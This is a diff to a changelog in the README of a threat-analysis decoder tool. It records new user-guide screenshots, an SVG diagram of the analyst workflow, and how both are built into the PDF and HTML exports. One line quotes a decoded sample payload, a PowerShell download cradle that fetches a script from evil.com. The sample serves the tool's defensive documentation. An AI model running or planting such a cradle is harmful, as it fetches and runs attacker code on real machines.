@@ -1,7 +1,37 @@
 # NivXRay — Decoder & Threat Analysis Platform
 
 
-## Latest Change (Feb 2026 — 🤖 Documentation Generator Phase 6 · Docs Automation Pipeline)
+## Latest Change (Feb 2026 — 🗺️ User Guide Phase 1 · Screenshots + 5W1H Flow Diagram)
+
+### Delivered
+
+**A. Analyst screenshots (Playwright capture)**
+- Fixed `capture_docs_screenshots.py` — `type_into` now runs BEFORE `click_before` so decode buttons are enabled when clicked
+- Rewrote `encoded_powershell.yaml` capture block with real interactions (paste PowerShell blob → SMART DECODE → toggle Candidate Explorer → AUTO INVESTIGATE)
+- New workflow `docs/workflows/workspace_tour.yaml` — 6-step Getting-Started Tour: Empty → Paste → Decode → Full-page output view → Candidate Explorer → Auto-Investigate verdict
+- Ran capture against preview → **11 real PNG screenshots** now under `docs/screenshots/{workspace_tour,encoded_powershell}/step_*.png`
+- Verified via viewer: screenshot #4 shows full workspace with decoded plaintext `New-Object Net.WebClient.DownloadString('http://evil.com/a.ps1')`, Candidate Explorer, chain replay, and Threat Analysis tabs
+
+**B. 5W1H Analyst Flow diagram (hand-crafted SVG)**
+- New `docs/assets/analyst_flow.svg` — dark-themed 1080×820 SVG covering the 5W1H framework:
+  - **WHAT** (suspicious payload) → **WHERE** (Workspace input) → **WHEN**/**WHY** siblings → **HOW** (strategy) → 4 **WHICH** leaves (NIVXRAY / AUTO / MAGIC / CHAIN) → 3 outcomes (OUTPUT / INSPECT / ACT) → **LEARN** loop-back
+  - Uses NivXRay's brand palette (mint accents, amber highlights, rose leaves, violet HOW node, deep slate backdrop)
+- New endpoint `GET /api/docs/assets/{filename}` — serves SVG/PNG/GIF static docs assets with path-traversal protection
+
+**C. Wired into all three output formats**
+- **DocsPage.jsx**: fetches SVG via authed axios and inlines it with `dangerouslySetInnerHTML` above the auto-generated guide markdown. `data-testid="docs-analyst-flow-banner"` + `docs-analyst-flow-svg`
+- **HTML exporter** (`docs/exporters.py`): inlines the SVG right below the cover banner with a "5W1H" section header
+- **PDF exporter** (`docs/pdf_generator.py`): renders the SVG via `svglib.svg2rlg` scaled to the 7.3-inch content frame, placed on a dedicated page between the TOC and the workflows section
+
+**Verified live**:
+- `/docs` displays the full flow diagram (all 12 boxes + arrows + loop-back banner) rendered natively as SVG
+- PDF grew 51 KB → 57 KB with the diagram embedded
+- HTML export contains `<svg>` inline
+- All 31 pdf + extras regression tests still green
+
+---
+
+## Previous Change (Feb 2026 — 🤖 Documentation Generator Phase 6 · Docs Automation Pipeline)
 
 ### Delivered — closed-loop docs automation: coverage · scaffold · suggest-fix
 
